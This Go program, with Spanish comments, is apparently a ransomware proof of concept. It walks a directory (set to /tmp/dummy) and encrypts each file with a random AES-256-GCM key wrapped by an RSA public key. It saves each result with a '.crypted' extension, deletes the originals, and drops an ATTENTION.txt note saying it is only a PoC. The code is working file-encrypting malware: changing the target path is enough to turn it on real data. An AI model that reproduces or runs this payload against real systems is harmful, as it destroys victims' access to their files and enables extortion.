package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
)

func main() {
	publicKeyFile := "public.key"
	sourceDir := "/tmp/dummy"

	// 1. Cargar la clave pública
	publicKeyBytes, err := ioutil.ReadFile(publicKeyFile)
	if err != nil {
		fmt.Println("Error reading public key file:", err)
		return
	}

	block, _ := pem.Decode(publicKeyBytes)
	if block == nil {
		fmt.Println("Failed to decode PEM block containing the key")
		return
	}

	parsedKey, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		fmt.Println("Error parsing public key:", err)
		return
	}

	publicKey, ok := parsedKey.(*rsa.PublicKey)
	if !ok {
		fmt.Println("Error: loaded key is not an RSA public key")
		return
	}

	// 2. Recorrer los archivos del directorio
	err = filepath.Walk(sourceDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Si no es un directorio, procedemos a cifrar
		if !info.IsDir() {
			fmt.Println("Encrypting file:", path)

			// Leer el archivo original
			data, err := ioutil.ReadFile(path)
			if err != nil {
				return fmt.Errorf("error reading file %s: %v", path, err)
			}

			// Generar una clave AES aleatoria (32 bytes para AES-256)
			aesKey := make([]byte, 32)
			if _, err := rand.Read(aesKey); err != nil {
				return fmt.Errorf("error generating AES key: %v", err)
			}

			// Cifrar el contenido del archivo usando AES
			encryptedData, err := encryptAES(data, aesKey)
			if err != nil {
				return fmt.Errorf("error encrypting file data: %v", err)
			}

			// Cifrar la clave AES usando RSA y la clave pública
			encryptedKey, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, aesKey, nil)
			if err != nil {
				return fmt.Errorf("error encrypting AES key: %v", err)
			}

			// Combinar la clave cifrada + los datos cifrados
			finalData := append(encryptedKey, encryptedData...)

			// Guardar el archivo cifrado con extensión .crypted
			newPath := path + ".crypted"
			err = ioutil.WriteFile(newPath, finalData, 0644)
			if err != nil {
				return fmt.Errorf("error writing encrypted file %s: %v", newPath, err)
			}
			fmt.Println("File encrypted and saved as:", newPath)

			// 3. Borrar el archivo original (Simulando el ataque)
			if err := os.Remove(path); err != nil {
				return fmt.Errorf("error deleting original file %s: %v", path, err)
			}
			fmt.Println("Original file deleted:", path)
		}
		return nil
	})

	if err != nil {
		fmt.Println("Error during directory encryption:", err)
		return
	}

	fmt.Println("All files encrypted and original files removed successfully.")

	// 4. Crear la nota de rescate ATTENTION.txt
	attentionFile := filepath.Join(sourceDir, "ATTENTION.txt")
	content := "this is only a PoC. Please, never pay for ransomware."
	err = ioutil.WriteFile(attentionFile, []byte(content), 0644)
	if err != nil {
		fmt.Println("Error creating ATTENTION.txt:", err)
		return
	}
	fmt.Println("ATTENTION.txt created in", sourceDir)
}

// encryptAES cifra datos utilizando AES-GCM
func encryptAES(data, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, aesGCM.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}

	ciphertext := aesGCM.Seal(nonce, nonce, data, nil)
	return ciphertext, nil
}
